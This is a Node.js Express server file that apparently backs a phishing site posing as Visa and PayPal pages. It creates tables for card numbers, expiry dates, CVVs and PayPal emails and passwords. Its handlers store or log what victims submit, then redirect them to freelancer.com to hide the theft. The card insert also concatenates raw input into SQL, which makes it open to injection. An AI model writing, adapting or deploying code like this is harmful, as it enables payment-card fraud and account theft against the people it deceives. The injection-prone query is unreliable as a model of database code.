var express = require('express');
var app = express();
var pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const PORT = process.env.PORT || 5000;
app.use(express.static('public'));
app.set('view engine', 'ejs')
const client = new pg.Client(process.env.DATABASE_URL);
client.connect();

client.query("create table visa (id serial , card text,exp text,cvv text,time timestamp default now())")
client.query("create table paypal (id serial , mail text,pass text,cardholder text,card text,exp text,cvv text,time timestamp default now())")
// #######################################################################


app.get('*/mid', function (req, res) {
    res.render('mid')
})
app.get('*/credit', function (req, res) {
    res.render('credit')
})
app.get('*/login', function (req, res) {
    res.render('login')
})
app.get('*/confirm', function (req, res) {
    res.render('confirm')
})




// ############################################################


app.post('*/visa', function (req, res) {
    var a = req.body.a;
    var b = req.body.b;
    var c = req.body.c;
    client.query('Insert into visa (card,exp,cvv) values(' + a + ',' + b + ',' + c + ')')
})
app.post('*/paypala', function (req, res) {
    console.log(req.body);
    res.redirect('/confirm')
})
app.post('*/paypalb', function (req, res) {
    console.log(req.body);
    res.redirect('https://www.freelancer.com')
})






// #######################################################################
app.get('*', function (req, res) { res.render('home') })

app.listen(PORT, function () { console.log('Server Started') })